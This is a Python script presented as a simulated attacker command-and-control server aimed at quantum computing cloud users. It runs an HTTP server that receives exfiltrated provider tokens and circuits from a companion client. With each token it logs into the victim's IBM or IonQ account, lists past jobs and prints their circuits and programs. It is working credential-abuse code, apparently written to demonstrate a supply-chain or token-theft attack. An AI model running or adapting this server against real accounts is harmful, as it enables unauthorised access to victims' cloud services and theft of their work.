"""
Simulate an attacker c2 server.

This should run on its own machine, to properly simulate an attacker
sending remote data (exfiltrating tokens and circuits). Can also be
used on the same machine for testing, should work.
"""

import sys
import json
import socket
import argparse
import datetime
import qiskit_ibm_provider
import qiskit_ionq

from http.server import HTTPServer, BaseHTTPRequestHandler


class HttpHandler(BaseHTTPRequestHandler):
    """A class to handle the logic of an HTTP server handler."""

    obj = None

    def do_GET(self):
        """
        Handle get requests from client.

        Not really used as we're just sending hello world back.

        Returns
        -------
        None
        """
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Hello, world!")

    def do_POST(self):
        """
        Handle post requests from client.

        This is basically what is sent by the client script.
        > With /token we're getting a token discovered on the machine.
            When we get a token, we're scheduling a job to connect to the
            specified provider and gather history of all previous jobs.
        > With /circuit we're getting a circuit the user is trying to run.

        Returns
        -------
        None
        """
        content_len = int(self.headers.get("Content-Length"))
        post_body = self.rfile.read(content_len).decode("utf-8")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Ack!")

        if self.path == "/token":
            data = json.loads(post_body)
            print("[*] Received /token %s" % (data))
            self.obj._jobs(data)
        elif self.path == "/circuit":
            circuit = json.loads(post_body)["circuit"]
            print("[*] Received circuit:\r\n {}".format(circuit))
        else:
            print("[*] Unsupported request: {}!".format(self.path))


class HttpServer:
    """A class to handle the logic of an HTTP server."""

    def __init__(self, obj, port):
        """
        Initialize the HttpServer instance.

        This class is just a required wrapper over the HttpServer.

        Parameters
        ----------
        obj : C2Server
            Represents the actual handler for the c2 server. This object
            knows how to handle token jobs that the handler will schedule.
        """
        HttpHandler.obj = obj
        server = HTTPServer((self._ip(), port), HttpHandler)
        print("[*] Started server on %s : %d" % (self._ip(), port))
        server.serve_forever()

    def _ip(self):
        """
        Find the ip of the current machine.

        Connects to 8.8.8.8 and then uses the getsockname()
        to find the ip of the current machine.

        Returns
        -------
        The ip of the local machine.
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()

        return ip


class C2Server(object):
    """A class which contains the custom logic to handle specific requests.."""

    def __init__(self):
        """Initialize the C2Server instance."""
        pass

    def _jobs(self, data):
        """
        Execute a job-discovery task with given data token.

        This method is called from HttpHandler when we get a /token POST request.

        Parameters
        ----------
        data : dict
            The json that the daemon script sends containing the token.
            This selects based on the provider type the job type that
            knows how to interact witht that specific provider.

        Returns
        -------
        None
        """
        print("[*] Query jobs ...")
        {"IBM": self._jobs_ibm, "QI": self._jobs_qi, "IonQ": self._jobs_ionq}[data["provider"]](data["token"])

    def _jobs_ibm(self, token):
        """
        Execute a job-discovery task with given data token for ibm provider.

        Parameters
        ----------
        token : str
            Token that may be used to connect to an ibm cloud account.

        Returns
        -------
        None
        """
        print("[*] Query IBM jobs for token %s" % (token))
        queried_jobs = set()
        provider = qiskit_ibm_provider.IBMProvider(token=token)
        jobs = provider.jobs()

        for job in jobs:
            if job.job_id() in queried_jobs:
                continue
            queried_jobs.add(job.job_id)

            job_data = provider.retrieve_job(job.job_id())
            print(
                "[*] Job : job_id = %s, state = %s, creation_date = %s"
                % (
                    job_data.job_id(),
                    job_data.status(),
                    job_data.creation_date().strftime("%Y-%m-%d %H:%M"),
                )
            )

            for circuit in job_data.circuits():
                circuit.draw(output="text")

    def _jobs_qi(self, token):
        """
        Execute a job-discovery task with given data token for QI provider.

        This is currently not implemented!

        Parameters
        ----------
        token : str
            Token that may be used to connect to a QI cloud account.

        Returns
        -------
        None
        """
        print("[*] Query QI jobs for token %s" % (token))

    def _jobs_ionq(self, token):
        """
        Execute a job-discovery task with given data token for IonQ provider.

        Parameters
        ----------
        token : str
            Token that may be used to connect to a IonQ cloud account.

        Returns
        -------
        None
        """
        print("[*] Query IonQ jobs for token %s" % (token))
        provider = qiskit_ionq.IonQProvider(token=token)
        backend = provider.get_backend('ionq_simulator')
        client = backend.client
        req_path = client.make_path("jobs")
        jobs = client._get_with_retry(req_path, headers=client.api_headers).json()

        for job in jobs["jobs"]:
            job_id = job["id"]
            req_path = client.make_path("jobs", job_id, "program")
            program = client._get_with_retry(req_path, headers=client.api_headers)
            print(
                "[*] Job : job_id = %s, state = %s, request = %s"
                % (
                    job_id,
                    job["status"],
                    datetime.datetime.utcfromtimestamp(job["request"]).strftime("%Y-%m-%d %H:%M")
                )
            )
            print(json.dumps(program.json(), indent=4))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Quantum C2")
    parser.add_argument(
            "--port", help="Port used for C2. Default: 8000", action="store", required=False, default="8000"
    )
    args = parser.parse_args(sys.argv[1:])

    c2 = C2Server()
    server = HttpServer(c2, int(args.port))
